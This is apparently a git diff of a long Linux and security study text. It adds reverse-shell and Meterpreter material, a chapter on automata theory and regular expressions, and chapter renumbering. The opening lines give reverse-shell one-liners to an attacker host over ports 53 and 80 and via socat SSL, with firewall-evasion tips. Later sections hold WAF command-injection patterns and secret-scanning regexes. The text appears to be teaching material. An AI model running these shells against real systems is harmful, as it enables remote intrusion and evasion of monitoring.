+bash -i >& /dev/tcp/attacker/53 0>&1     # DNS port
+bash -i >& /dev/tcp/attacker/80 0>&1     # HTTP port
+
+# 2. Encrypt the traffic (defeats content inspection)
+# Use the openssl method from Part 6
+
+# 3. Use DNS for exfiltration (bypasses most firewalls)
+# DNS queries are allowed almost everywhere
+# Encode commands in DNS queries, exfiltrate data in DNS responses
+# Tools: dnscat2, iodine
+
+# 4. Use legitimate protocols
+# Reverse shell over HTTP (looks like web traffic)
+# Reverse shell over WebSockets
+# Tools: Metasploit HTTPS meterpreter, Cobalt Strike HTTP beacon
+
+# 5. socat with SSL (encrypted + legitimate-looking)
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane \
+  OPENSSL:attacker_ip:4444,cert=/tmp/cert.pem,cafile=/tmp/cert.pem
+```
+
+---
+
+### Part 10 — Meterpreter vs Raw Reverse Shell
+
+A **Meterpreter** shell (from Metasploit) is fundamentally different from a raw bash reverse shell:
+
+```
+Raw reverse shell (bash -i >& /dev/tcp/...):
+  Bash process running on target
+  All commands visible in process list: ps aux shows /bin/bash
+  Commands sent as plaintext (unless encrypted)
+  Shell limited to what bash can do
+  Leaves bash in process list
+  Write to disk: yes (bash binary already there)
+
+Meterpreter:
+  Runs entirely in memory — no files written to disk
+  Injected as shellcode into an existing process
+  Encrypted communications (TLS by default)
+  Extends functionality via in-memory plugins
+  Can migrate to other processes (changes PID)
+  Staged: small initial payload downloads full agent
+  ps aux shows the HOST process (e.g., svchost.exe), not meterpreter
+  Has: file download/upload, screenshot, keylogger, port forward
+       without ever spawning a shell process visible in ps
+
+Architecture:
+  Stage 1 (stager): tiny shellcode that calls socket()+connect()
+                    downloads stage 2 over the connection
+  Stage 2 (agent):  full meterpreter DLL/shared library
+                    loaded entirely into memory
+                    implements a rich RPC protocol over TLS
+
+From the target OS perspective:
+  One process (the injected one) has an extra TCP connection
+  No bash, no python, no extra processes
+  Much harder to detect than a bash reverse shell
+```
+
+---
+
+### The Complete Mental Model — All Cases
+
+```
+TERMINAL          SHELL          PROMPT     BEHAVIOUR
+─────────────     ────────       ──────     ─────────────────────────
+PTY (xterm)       bash           PS1 str    Normal interactive session
+PTY (xterm)       python3        ">>> "     Python REPL, no shell
+PTY (xterm)       top            (none)     top UI, no shell at all
+PTY (xterm)       cat            (none)     echo mode, no shell
+None (file)       bash           (none)     Script mode, silent
+None (pipe)       bash           (none)     Script mode, silent
+None (socket)     bash -i        PS1 str    Dumb reverse shell
+PTY (socat)       bash -i        PS1 str    Proper reverse shell
+None (socket)     meterpreter    N/A        In-memory agent, no shell
+PTY (tmux)        bash           PS1 str    Multiplexed session
+PTY (ssh-remote)  bash           PS1 str    Remote session via network
+
+Key variables:
+  isatty(0) true  = interactive mode = PS1 printed
+  isatty(0) false = script mode = no PS1
+  PTY present     = line discipline active = Ctrl-C, arrow keys work
+  PTY absent      = raw bytes only = "dumb shell"
+  Controlling terminal present = /dev/tty works = sudo, vim work
+  Controlling terminal absent  = /dev/tty fails = sudo, vim break
+```
+
+
+---
+
 ## Unix — The Operating System Born From a Teletype
 
 ## Bell Labs, 1969
@@ -2986,89 +4842,559 @@ Your program writes the same `read()` call. The kernel routes it to the right im
 -e 
 ---
 
-# Chapter 04: The Von Neumann Architecture — How the CPU Drives Itself
-
-With the philosophy established, we need to understand the hardware that runs everything. Before any operating system, before any code, there is a physical machine. Von Neumann's insight about how that machine should work is the reason computers can run without human intervention — and it is the reason every concept in this document is possible.
-
----
-
-## The Von Neumann Architecture
-
-Before Von Neumann's proposal in 1945, computers were hardwired machines. To change what a computer did, you physically rewired its circuits — like rewiring a building's entire electrical system just to change the lighting pattern. Every new task required a hardware change.
-
-Von Neumann proposed something radical: store the program instructions in the same memory as the data, and build the central processing unit with a built-in loop that fetches and executes those instructions automatically, one after another, forever.
-
-This is called the Fetch-Decode-Execute cycle, and it is the heartbeat of every modern computer:
-
-```
-┌─────────────────────────────────────────────────────┐
-│                                                     │
-│   FETCH      Read next instruction from memory      │
-│     ↓        at the address in the Program Counter  │
-│   DECODE     Figure out what that instruction means │
-│     ↓                                               │
-│   EXECUTE    Carry out the instruction              │
-│     ↓        (add, move, compare, jump)             │
-│   INCREMENT  Program Counter moves to next address  │
-│     ↓                                               │
-│     └──────────────── repeat forever ───────────────┘
-│                                                     │
-└─────────────────────────────────────────────────────┘
-```
-
-The Program Counter is a register inside the central processing unit that holds the memory address of the next instruction to execute. After each instruction, it automatically increments to the next address. Nobody tells it to do this — it is the hardware design.
-
-Von Neumann's architecture also defines that memory and instructions share the same address space. This means a program can read its own instructions as data, write new instructions into memory, and jump to them. This is the foundation of self-modifying code, just-in-time compilation, and — as you will see in the exploitation chapter — the entire concept of shellcode injection.
-
-> **Von Neumann's gift to computing: the machine drives itself.** Once started, the central processing unit needs no human to say "now execute the next instruction." The Program Counter increments automatically. This is why computers can run without human intervention from power-on to shutdown.
-
-The key question becomes: what instruction is at the very first address when power is applied?
-
----
-
-## The Fixed Starting Address — How the Central Processing Unit Knows Where to Begin
-
-On x86 architecture processors, every manufacturer agrees on one rule: when electricity first hits the chip, the Program Counter is initialised to a specific physical memory address — hexadecimal `0xFFFFFFF0`. This is not software — it is hardwired into the silicon itself.
-
-The motherboard manufacturer places a read-only memory chip on the board and maps it to that address. This chip contains the firmware — called BIOS on older systems or UEFI on modern systems. The central processing unit starts its fetch-decode-execute loop, reads the instruction at `0xFFFFFFF0`, and it is firmware code. Nobody placed it there at boot time — it was burned into the chip permanently during manufacturing.
-
-### Power On Self Test
-
-The firmware's first job is called Power On Self Test. This sequence tests and initialises all the hardware so the rest of the boot chain can rely on it working correctly:
-
-- Tests the central processing unit registers and arithmetic units
-- Tests and sizes the RAM chips
-- Discovers and initialises devices on the PCI bus — storage controllers, network cards, graphics
-- Identifies available storage devices — hard drives, solid state drives, optical drives, USB
-- Performs a basic system integrity check
-
-After Power On Self Test completes, the firmware looks for a bootable device according to the configured boot order and hands control to the bootloader.
-
----
-
-## The Bootloader — GRUB Stage 1 and Stage 2
-
-On systems using the old MBR scheme, the firmware reads the first 512 bytes of the chosen disk into RAM at address `0x7C00` and jumps there. These 512 bytes are GRUB Stage 1.
-
-The problem is that 512 bytes is tiny — barely enough to hold a minimal program. GRUB Stage 1 does one thing only: it knows where on disk GRUB Stage 2 lives, loads it into RAM, and jumps to it. Stage 2 is a full-sized program with no 512-byte limitation. It reads the filesystem, finds its configuration file, shows the boot menu, and loads the kernel.
-
-```
-MBR path:
-Firmware reads first 512 bytes of disk → loads to 0x7C00 → jumps there
-         │
-         ↓
-GRUB Stage 1 (512 bytes — just enough to find Stage 2)
-         │
-         ↓
-GRUB Stage 2 (full program — reads filesystem, shows menu)
-```
-
----
-
 -e 
 ---
 
-# Chapter 05: How Code Works — Machine Code, Assembly, C and Compilers
+# Chapter 05: Automata Theory, Formal Languages and Regular Expressions
+
+Chapters 01-04 covered hardware and privilege. This chapter steps into the mathematical theory that underlies how computers recognise patterns, how compilers understand programming languages, how network protocols are verified, and how the text tools you use daily in cybersecurity actually work. The theory comes before the practice because understanding the mathematics makes the tools — and their limitations — completely clear.
+
+---
+
+## The Question That Started It All
+
+In the 1930s, mathematicians asked a fundamental question before electronic computers even existed:
+
+> **What does it mean to compute something? What problems can be solved mechanically by following rules — and what problems cannot be solved at all?**
+
+Three independent answers emerged simultaneously, all equivalent to each other:
+
+```
+1936 — Alan Turing:
+  Defined computation using the Turing Machine
+  A theoretical device: tape + read-write head + state table
+  "A problem is computable if a Turing Machine can solve it"
+  Defined the outer limit of what any computer can ever do
+
+1936 — Alonzo Church:
+  Defined computation using Lambda Calculus
+  Mathematical functions and substitution rules
+  Proved equivalent to Turing Machines — same power
+
+1943 — McCulloch and Pitts:
+  Modelled brain neurons as mathematical logic circuits
+  Networks of simple on/off elements could compute
+  Seeded both neural network theory AND finite automaton theory
+```
+
+These converged into **computability theory** and **formal language theory** — the mathematical study of what machines can recognise and compute.
+
+---
+
+## What Is a Formal Language
+
+In mathematics, a **language** is not English or French. It is simply a set of strings — a collection of sequences of symbols.
+
+```
+Alphabet: the set of allowed symbols
+  Binary alphabet: {0, 1}
+  ASCII alphabet: all printable characters
+  Programming language alphabet: {a-z, A-Z, 0-9, +, -, *, /, (, ), ...}
+
+String: a finite sequence of symbols from the alphabet
+  Over {a, b}: "", "a", "b", "ab", "aba", "bbb"
+
+Language: any set of strings over an alphabet
+  Language 1: all strings of only digits
+              {"0", "1", ..., "9", "00", "01", ..., "123", ...}
+
+  Language 2: all strings with equal numbers of 'a' and 'b'
+              {"", "ab", "ba", "aabb", "abba", "abab", ...}
+
+  Language 3: all valid Python programs
+              (a very large set, but still a set of strings)
+```
+
+The central question of formal language theory: **given a string and a language, can a machine decide whether the string belongs to the language?** And crucially — what kind of machine is required for each type of language?
+
+---
+
+## The Chomsky Hierarchy — Four Classes of Languages
+
+Noam Chomsky formalised a hierarchy of languages in 1956. Each class requires a more powerful machine to recognise it. This hierarchy is one of the most important results in computer science.
+
+```
+Type 3 — Regular Languages
+  Most restricted, simplest
+  Machine required: Finite Automaton (no memory beyond current state)
+  Notation: Regular Expressions
+  Examples: digit strings, email format, IP address patterns
+  Limitation: cannot count, cannot handle nested structures
+
+Type 2 — Context-Free Languages
+  More powerful
+  Machine required: Pushdown Automaton (finite automaton + a stack)
+  Notation: Context-Free Grammars
+  Examples: arithmetic expressions, programming language syntax,
+            balanced parentheses, HTML structure
+  The stack allows counting depth and matching nested structures
+
+Type 1 — Context-Sensitive Languages
+  Machine required: Linear Bounded Automaton
+  More powerful than pushdown but bounded memory
+  Rare in practice
+
+Type 0 — Recursively Enumerable Languages
+  Most general, most powerful
+  Machine required: Turing Machine (full computation)
+  Includes everything computable
+  Some problems in this class are undecidable (halting problem)
+```
+
+This hierarchy directly explains what each tool can and cannot do. Regular expressions sit at Type 3 — the simplest level. This is not a weakness of the notation — it is a precise mathematical statement about what finite automata can recognise.
+
+---
+
+## Finite Automata — The Machine Behind Regular Expressions
+
+A **finite automaton** is the most minimal conceivable computing machine. It has:
+
+- A finite set of **states** — like positions on a board game
+- A **current state** it occupies right now
+- **Transition rules** — "if in state X and you read symbol Y, move to state Z"
+- A designated **start state**
+- A set of **accept states** — states that mean "yes, this string is in the language"
+
+It reads input one character at a time, follows transitions, and accepts or rejects based on its final state.
+
+```
+Example: automaton that accepts strings containing "cat"
+
+States: S0 (start), S1 (saw c), S2 (saw ca), S3 (saw cat — ACCEPT)
+
+Transitions:
+  S0 --c--> S1       (saw 'c', might be start of "cat")
+  S0 --other--> S0   (anything else, stay waiting)
+  S1 --a--> S2       (saw 'ca')
+  S1 --c--> S1       (new 'c', restart c-tracking)
+  S1 --other--> S0
+  S2 --t--> S3       (saw "cat" — accept!)
+  S2 --other--> S0
+  S3 --anything--> S3 (once accepted, stay accepted)
+
+Running "concatenate":
+  c -> S1
+  o -> S0  (not 'a', back to start)
+  n -> S0
+  c -> S1
+  a -> S2
+  t -> S3  ACCEPT
+  e -> S3  (stay)
+  ...remaining characters...
+  End in S3 -> "concatenate" CONTAINS "cat" -> MATCH
+```
+
+The crucial limitation: **a finite automaton has no memory beyond its current state.** It cannot count. It cannot remember what it saw three characters ago. It can only follow rules based on current state and current character.
+
+### DFA vs NFA — Two Equivalent Flavours
+
+```
+DFA — Deterministic Finite Automaton:
+  From any state, each input symbol leads to exactly ONE next state
+  No ambiguity
+  Efficient to execute: one transition per character
+  Guaranteed O(n) matching time (n = input length)
+
+NFA — Nondeterministic Finite Automaton:
+  From a state, one input symbol may lead to MULTIPLE possible next states
+  The automaton is in ALL possible states simultaneously (superposition)
+  Easier to construct from a regex pattern
+  Converted to DFA for efficient execution
+
+Key theorem:
+  DFA and NFA recognise exactly the same set of languages
+  Every NFA can be converted to an equivalent DFA
+  (the DFA may have exponentially more states, but it exists)
+```
+
+---
+
+## Kleene's Insight — Regular Expressions and Finite Automata Are Equivalent
+
+Stephen Kleene proved in 1951 the fundamental theorem:
+
+> **A language can be recognised by a finite automaton if and only if it can be described by a regular expression. They are two notations for exactly the same mathematical concept.**
+
+```
+Regular expression          Equivalent finite automaton
+──────────────────          ──────────────────────────
+a                           automaton accepting only "a"
+ab                          automaton accepting only "ab"
+a|b                         automaton accepting "a" or "b"
+a*                          automaton accepting "", "a", "aa", "aaa"...
+[0-9]+                      automaton with digit-loop needing at least one digit
+(cat|dog)                   two paths merging at one accept state
+
+Conversion algorithms:
+  regex -> NFA:  Thompson's construction (Ken Thompson, 1968)
+  NFA -> DFA:    Subset construction algorithm
+  DFA -> regex:  Kleene's algorithm
+  DFA -> minimal DFA: Hopcroft's minimisation algorithm
+
+All four representations are interchangeable.
+```
+
+The **word "regular"** in regular expression comes from this: languages that are recognised by finite automata were defined by Kleene as "regular" — meaning they follow strict rules that a finite, memoryless machine can enforce. It has nothing to do with CPU registers. The coincidence of similar-sounding names in two different fields causes common confusion.
+
+---
+
+## Ken Thompson — Bringing Theory Into Practice (1968)
+
+Kleene's 1951 mathematical notation sat in theoretical computer science for 17 years. **Ken Thompson** — the same person who created Unix and the first Unix shell — brought regular expressions into practical computing in 1968.
+
+Thompson was building a text editor (QED, ancestor of Unix `ed`) and needed users to be able to specify text search patterns. He took Kleene's notation and implemented it efficiently by converting regex patterns to NFAs and simulating them.
+
+Thompson's 1968 implementation guaranteed **O(n) matching time** — matching took time proportional to the length of the input string, regardless of pattern complexity. This guarantee comes directly from the finite automaton theory: simulating all NFA states simultaneously means you never backtrack.
+
+```
+Thompson's NFA simulation (1968):
+
+Instead of: try one path, if it fails backtrack and try another
+            (exponential worst case)
+
+Do this:    maintain the SET of all states the NFA could be in
+            after reading each character
+            update the set on each character
+            if the set contains any accept state: match
+
+Example with pattern (a|b)*c and input "aabbc":
+
+After 'a': {S1, S2}        (both a-path and b-path states active)
+After 'a': {S1, S2}        (still in both a-path states)
+After 'b': {S1, S2}        (b transitions keep us in loop states)
+After 'b': {S1, S2}
+After 'c': {S3}            (c transition reaches accept state)
+Result: MATCH
+
+Only one pass through the input.
+Never more work than the number of states times input length.
+O(n * m) where n=input length, m=number of NFA states
+Guaranteed no exponential blowup.
+```
+
+---
+
+## The Regex Syntax — What Each Symbol Means
+
+```
+Literal characters:
+  a        matches exactly 'a'
+  abc      matches exactly "abc"
+
+Metacharacters (special meaning):
+  .        matches any single character except newline
+  ^        anchors match at start of string (or line with MULTILINE)
+  $        anchors match at end of string (or line)
+
+Quantifiers (how many times):
+  *        zero or more of the preceding element
+  +        one or more of the preceding element
+  ?        zero or one of the preceding element
+  {n}      exactly n times
+  {n,m}    between n and m times (inclusive)
+  {n,}     n or more times
+
+Character classes:
+  [abc]    matches 'a', 'b', or 'c'
+  [a-z]    matches any lowercase letter
+  [0-9]    matches any digit
+  [^abc]   matches anything EXCEPT 'a', 'b', 'c'
+
+Shorthand character classes:
+  \d       any digit [0-9]
+  \D       any non-digit
+  \w       any word character [a-zA-Z0-9_]
+  \W       any non-word character
+  \s       any whitespace (space, tab, newline)
+  \S       any non-whitespace
+
+Grouping and alternation:
+  (abc)    group — treats "abc" as a unit, also captures match
+  (?:abc)  non-capturing group — unit but no capture
+  a|b      alternation — matches 'a' or 'b'
+
+Anchors:
+  \b       word boundary (between \w and \W)
+  \B       non-word boundary
+
+PCRE extensions (beyond strict regular languages):
+  (?=...)  positive lookahead — match only if followed by ...
+  (?!...)  negative lookahead
+  (?<=...) positive lookbehind
+  \1       backreference to capture group 1 (technically non-regular)
+```
+
+---
+
+## What Regex Can and Cannot Do — The Boundary
+
+```
+CAN be matched with regex alone (Type 3 — regular):
+  Valid integer:          ^-?[0-9]+$
+  Valid hex colour:       ^#[0-9A-Fa-f]{6}$
+  Valid IPv4 address:     ^\d{1,3}(\.\d{1,3}){3}$
+  Lines containing ERROR: .*ERROR.*
+  Email address format:   ^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$
+  AWS access key:         AKIA[0-9A-Z]{16}
+
+CANNOT be matched with regex alone (Type 2 or higher):
+  Balanced parentheses:   ((()))  needs stack to count depth
+  Valid HTML:             needs stack for tag nesting
+  Valid JSON:             needs stack for nested structures
+  Palindromes:            racecar needs to remember first half
+  Matching XML open/close tags: <tag>...</tag> needs to remember tag name
+  Valid Python programs:  full programming language grammar
+
+The famous Stack Overflow answer "You cannot parse HTML with regex"
+is a direct consequence of the Chomsky hierarchy:
+HTML is Type 2 (context-free), regex is Type 3 (regular),
+and Type 3 is strictly less powerful than Type 2.
+```
+
+---
+
+## ReDoS — When Regex Becomes a Vulnerability
+
+Regular Expression Denial of Service occurs when a regex engine that uses backtracking (instead of Thompson's NFA simulation) encounters a carefully crafted input that causes exponential backtracking.
+
+```
+Vulnerable regex: (a+)+$
+  Intended to match: one or more groups of one or more a's
+                     anchored at end of string
+
+Malicious input: "aaaaaaaaaaaaaaaaaaaab"
+  (n a's followed by one non-matching character)
+
+Backtracking engine tries all possible groupings:
+  (aaaaaaaaaaaaaaaaaaaa)         -> tries 'b' against '$' -> fail
+  (aaaaaaaaaaaaaaaaaaa)(a)       -> fail
+  (aaaaaaaaaaaaaaaaaa)(aa)       -> fail
+  (aaaaaaaaaaaaaaaaaa)(a)(a)     -> fail
+  ... 2^n combinations for n a's ...
+
+For 20 a's:  ~1 million attempts
+For 30 a's:  ~1 billion attempts
+For 40 a's:  ~1 trillion attempts
+
+One HTTP request with a crafted string can peg a server's CPU
+at 100% for minutes or hours. Denial of service achieved.
+
+Real-world ReDoS victims:
+  2016: Stack Overflow went down for 34 minutes
+        Caused by: ^[\s\u200c\u200d\u180e]*|[\s\u200c\u200d\u180e]*$
+  2019: Cloudflare outage
+        Caused by: (?:(?:\"|'|\]|\}|\\|\d|(?:nan|infinity|true|false|null|
+                   undefined|symbol|math)|\`|\-|\+)+[)]*;?((?:\s|-|~|!|\{\}|
+                   |\|\||\+)*.*(?:.*=.*))
+
+Prevention:
+  Use Thompson NFA engines: Go's regexp, Rust regex, RE2 (Google)
+  These guarantee O(n) matching regardless of pattern
+  Avoid backtracking engines (PCRE) for user-controlled patterns
+  Test patterns with tools: regexploit, vulnregex
+  Use possessive quantifiers where available: (a++)+ instead of (a+)+
+```
+
+---
+
+## Where Automata Theory Appears in Computing
+
+The theory is not just regex. It underlies systems you use constantly:
+
+### Compilers — Two Levels of Theory
+
+```
+Lexer (tokeniser) — uses finite automata (Type 3):
+  Input: "int x = 5 + y;"
+  Output: [INT][IDENTIFIER:x][EQUALS][INTEGER:5][PLUS][IDENTIFIER:y][SEMICOLON]
+
+  Each token type is described by a regex / finite automaton:
+    INTEGER:    [0-9]+
+    IDENTIFIER: [a-zA-Z_][a-zA-Z0-9_]*
+    OPERATOR:   [+\-*\/=<>!&|]
+  GCC's lexer is a massive DFA generated from token regex patterns
+
+Parser — uses pushdown automata (Type 2):
+  Input tokens from lexer
+  Recognises nested grammatical structure using a stack:
+    if (x > 0) { y = x + 1; }  <- nested blocks need stack
+  yacc, bison, ANTLR generate parsers from context-free grammars
+```
+
+### TCP — A Finite State Machine
+
+TCP is literally a finite automaton. Every TCP connection is in one of these states:
+
+```
+TCP state machine:
+
+States:
+  CLOSED, LISTEN, SYN_SENT, SYN_RECEIVED, ESTABLISHED,
+  FIN_WAIT_1, FIN_WAIT_2, CLOSE_WAIT, CLOSING, LAST_ACK, TIME_WAIT
+
+Transitions (triggered by packets received or sent):
+  CLOSED   --passive open--> LISTEN
+  LISTEN   --SYN received--> SYN_RECEIVED
+  SYN_RECEIVED --SYN+ACK sent, ACK received--> ESTABLISHED
+  ESTABLISHED --FIN sent--> FIN_WAIT_1
+  FIN_WAIT_1  --ACK received--> FIN_WAIT_2
+  FIN_WAIT_2  --FIN received--> TIME_WAIT
+  TIME_WAIT   --2MSL timeout--> CLOSED
+
+This IS a finite automaton in the textbook sense.
+The Linux kernel implements this state machine in tcp.c.
+```
+
+### Hardware Design
+
+Every digital circuit with state is a finite automaton. Traffic lights, elevator controllers, vending machines, and the CPU's own control unit (from Chapter 01) are all finite state machines designed using state diagram tools that are direct applications of automata theory.
+
+### Network Packet Inspection
+
+Intrusion Detection Systems and firewalls perform pattern matching on packet payloads. Hardware implementations of finite automata — built into ASICs — run at line rate (10+ Gbps) to match thousands of patterns simultaneously against every packet.
+
+---
+
+## Regular Expressions in Cybersecurity Practice
+
+### Text Processing — The Foundation Tools
+
+```bash
+# grep — uses POSIX BRE or ERE depending on flags
+grep "error" /var/log/syslog
+grep -E "^[0-9]{4}-[0-9]{2}-[0-9]{2}" logfile    # ERE
+grep -P "(?<=POST\s)/api/\w+" access.log           # PCRE
+
+# sed — stream editor
+sed 's/password=\w+/password=REDACTED/g' config.txt
+
+# awk — pattern-action
+awk '/4[0-9]{2}/ {print $7}' access.log   # URLs of 4xx responses
+```
+
+### Input Validation
+
+```python
+import re
+
+# Validate email format before processing
+email_re = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
+if not re.match(email_re, user_email):
+    raise ValueError("Invalid email format")
+
+# Ensure user_id is purely numeric (prevents SQL injection)
+if not re.match(r'^\d+$', user_id):
+    raise ValueError("user_id must be numeric")
+```
+
+### Web Application Firewall Patterns
+
+```
+SQL injection detection:
+  (?i)(union.*select|select.*from|insert.*into|drop.*table)
+  (?i)(\bor\b|\band\b).*=.*--
+  '.*OR.*'.*=.*'
+
+XSS detection:
+  <script[^>]*>.*?</script>
+  on\w+\s*=\s*["'][^"']*["']
+  javascript\s*:
+
+Path traversal:
+  \.\.\/|\.\.\\|%2e%2e%2f
+
+Command injection:
+  [;&|`$]|\b(cat|ls|whoami|id|uname)\b
+```
+
+### Secret and Credential Scanning
+
+```python
+# Patterns used by tools like truffleHog and gitleaks
+patterns = {
+    'aws_access_key':   r'AKIA[0-9A-Z]{16}',
+    'github_token':     r'ghp_[a-zA-Z0-9]{36}',
+    'private_key':      r'-----BEGIN (RSA |EC )?PRIVATE KEY-----',
+    'jwt_token':        r'eyJ[A-Za-z0-9-_]+\.eyJ[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+',
+    'connection_string':r'[a-zA-Z]+://[^:]+:[^@]+@[^/]+/\w+',
+    'api_key_generic':  r'(?i)(api[_-]?key|apikey|api[_-]?secret)["\s:=]+[A-Za-z0-9_\-]{16,}',
+}
+```
+
+### Log Analysis and SIEM
+
+```python
+# Parse Apache access log line into structured fields
+apache_re = (
+    r'^(\S+)'           # IP address
+    r'\s+\S+\s+\S+'     # ident and auth (usually - -)
+    r'\s+\[([^\]]+)\]'  # timestamp
+    r'\s+"(\w+)'        # HTTP method
+    r'\s+(\S+)'         # request path
+    r'\s+\S+"'          # HTTP version
+    r'\s+(\d+)'         # status code
+    r'\s+(\d+)'         # response size
+)
+match = re.match(apache_re, log_line)
+if match:
+    ip, timestamp, method, path, status, size = match.groups()
+```
+
+### Malware Analysis
+
+```python
+# Extract indicators of compromise from malware binary strings
+ioc_patterns = {
+    'domain':    r'\b(?:[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,}\b',
+    'ipv4':      r'\b(?:\d{1,3}\.){3}\d{1,3}\b',
+    'url':       r'https?://(?:[-\w.]|(?:%[\da-fA-F]{2}))+',
+    'registry':  r'(?:HKEY_[A-Z_]+|HK[CL][MRU]?)\\[^\x00\n]+',
+    'file_path': r'[A-Za-z]:\\(?:[^\\/:*?"<>|\r\n]+\\)*[^\\/:*?"<>|\r\n]*',
+}
+
+for name, pattern in ioc_patterns.items():
+    matches = re.findall(pattern, binary_strings, re.IGNORECASE)
+    for match in matches:
+        print(f"{name}: {match}")
+```
+
+---
+
+## The Complete Picture — From Theory to Tool
+
+```
+1936  Turing Machine — defines what is computable at all
+1943  McCulloch-Pitts neurons — seeds finite automaton theory
+1951  Kleene — regular expressions and finite automata proved equivalent
+1956  Chomsky — four-level language hierarchy formalised
+1968  Ken Thompson — implements regex for Unix QED editor
+             converts regex to NFA, guarantees O(n) matching
+             brings 17 years of theory into practical computing
+1973  Unix ships grep, sed, awk — regex enters mainstream
+1986  POSIX standardises BRE (basic) and ERE (extended)
+1987  Perl adds backreferences, lookahead — exceeds strict regular languages
+             "regular expression" becomes a misnomer for PCRE patterns
+1994  PCRE library — most languages adopt it (Python, PHP, Java, .NET)
+2007  Google publishes RE2 — returns to Thompson NFA approach
+             guarantees O(n), used in Go, RE2/J, Rust regex crate
+             eliminates ReDoS vulnerability by design
+
+Today:
+  Regex: grep, sed, awk, Python re, JavaScript RegExp, WAFs,
+         IDS/IPS, SIEM, secret scanners, malware analysis,
+         compiler lexers, network packet inspection
+
+  Automata theory underlies: TCP state machine, compiler lexers
+  and parsers, hardware design, formal verification, game AI,
+  hardware packet inspection at line rate in silicon
+
+  The mathematics Kleene described in 1951 for abstract
+  theoretical purposes runs on billions of devices every second.
+```
+-e 
+---
+
+# Chapter 06: How Code Works — Machine Code, Assembly, C and Compilers
 
 The CPU executes machine code. Everything else — assembly, C, Python — is a layer of abstraction on top of that reality. Understanding how code gets from human-readable source to bytes the CPU executes is essential before we can understand how the kernel itself is built, and later how memory vulnerabilities work.
 
@@ -3347,7 +5673,10 @@ Characteristic: Portable (same bytecode runs anywhere the VM exists),
 -e 
 ---
 
-# Chapter 06: Storage — Hard Drives, Partitions and Filesystems
+-e 
+---
+
+# Chapter 07: Storage — Hard Drives, Partitions and Filesystems
 
 The CPU executes code, but that code and data must live somewhere permanently. Storage is the foundation everything else builds on — the kernel itself lives on disk, the filesystem organises it, and the partition structure defines the boundaries. This chapter establishes how physical storage is divided, organised and accessed.
 
@@ -3626,7 +5955,10 @@ The entire Kali installer ran from the Ventoy USB drive (shown as sdb), which is
 -e 
 ---
 
-# Chapter 07: The Kernel Interface — Everything is a File, Inodes and System Calls
+-e 
+---
+
+# Chapter 08: The Kernel Interface — Everything is a File, Inodes and System Calls
 
 We now have a CPU that executes code, storage that holds data, and a philosophy about how an operating system should work. This chapter is where those three threads meet. The kernel provides one unified interface to every resource on the system — files, devices, network connections, processes. Understanding that interface is the key to understanding everything that runs on Linux.
 
@@ -3971,7 +6303,10 @@ If you can restrict a process's system calls, you limit what damage it can do ev
 -e 
 ---
 
-# Chapter 08: File Descriptors — The Unified Handle for Everything
+-e 
+---
+
+# Chapter 09: File Descriptors — The Unified Handle for Everything
 
 System calls return file descriptors. Everything the kernel manages — files, sockets, pipes, devices, timers — is accessed through a file descriptor once opened. This small integer is the practical implementation of "everything is a file." Understanding file descriptors explains how shell redirection works, how pipes connect programs, and how sockets and network connections fit into the same model.
 
@@ -4083,7 +6418,10 @@ ls process:                  grep process:
 -e 
 ---
 
-# Chapter 09: The Process Model — Fork, Exec and the Process Tree
+-e 
+---
+
+# Chapter 10: The Process Model — Fork, Exec and the Process Tree
 
 We have a kernel interface and a file descriptor system. Now we need to understand how programs actually run — how they start, how they create other programs, and how the entire tree of running processes on your system came to exist. Fork and exec are the two system calls that make all of this happen. Every process on your machine — from systemd down to your shell — exists because of these two calls.
 
@@ -4349,7 +6687,10 @@ The entire Unix pipeline mechanism — arbitrary chains of programs communicatin
 -e 
 ---
 
-# Chapter 10: The Boot Chain — Power On to Login
+-e 
+---
+
+# Chapter 11: The Boot Chain — Power On to Login
 
 We now have all the building blocks: the Von Neumann CPU, machine code, storage, the kernel interface, file descriptors, fork and exec. The boot chain is where all of these come together in sequence. Starting from the moment electricity hits the CPU, this chapter traces every step until your shell prompt appears — and every step now makes sense because you understand what it is building toward.
 
@@ -4541,7 +6882,10 @@ Above it, Linux is the same code on everything.
 -e 
 ---
 
-# Chapter 11: Networking — Sockets, TCP and the BSD API
+-e 
+---
+
+# Chapter 12: Networking — Sockets, TCP and the BSD API
 
 Processes communicate with each other through file descriptors and pipes. Processes communicate across a network through sockets. A socket is a file descriptor — everything you learned about file descriptors applies. The socket API was designed at Berkeley in 1983 and has not changed since. Every networked program ever written in C, Python, Go, Java or any other language uses this same API underneath.
 
@@ -4771,7 +7115,11 @@ The advantage over TCP: no network stack overhead, no IP headers, no TCP handsha
 -e 
 ---
 
-# Chapter 12: Network Defence — DDoS Protection and the Attack Surface
+-e 
+
+---
+
+# Chapter 13: Network Defence — DDoS Protection and the Attack Surface
 
 Now that you understand sockets and how servers accept connections, you can understand what a Distributed Denial of Service attack is actually doing — and more importantly, where to stop it. Every defence technique in this chapter maps directly to the networking concepts in the previous chapter.
 
@@ -4965,7 +7313,10 @@ findtime = 600    # failures counted within ten minutes
 -e 
 ---
 
-# Chapter 13: Service Sandboxing — Isolating Services from the OS
+-e 
+---
+
+# Chapter 14: Service Sandboxing — Isolating Services from the OS
 
 A server that handles network connections runs multiple services. Each service is a process with file descriptors, system calls and access to the filesystem. Sandboxing is the practice of restricting what a process can see and do — using the exact kernel mechanisms you now understand: namespaces that isolate the filesystem and network views, system call filters that restrict what the kernel allows, and file descriptor control that limits what resources a service can access.
 
@@ -5182,7 +7533,10 @@ sudo apparmor_parser -r /etc/apparmor.d/usr.bin.payment-api
 -e 
 ---
 
-# Chapter 14: Memory Vulnerabilities — Buffer Overflows and Beyond
+-e 
+---
+
+# Chapter 15: Memory Vulnerabilities — Buffer Overflows and Beyond
 
 This is where everything comes together from the offensive side. Memory vulnerabilities exist because programs run in the Von Neumann memory model you learned in Chapter 2, are written in C compiled to machine code from Chapter 3, run as processes created by fork and exec from Chapter 7, and make system calls through the kernel interface from Chapter 5. The return address on the stack is the address the CPU will fetch-decode-execute next — which you understand from Chapter 2. Every concept in this chapter is a direct consequence of everything that came before it.
 
@@ -6067,7 +8421,10 @@ strace -e trace=clone,execve bash
 
 ---
 
-# Chapter 15: Mobile Architecture — From Battery to Baseband
+-e 
+---
+
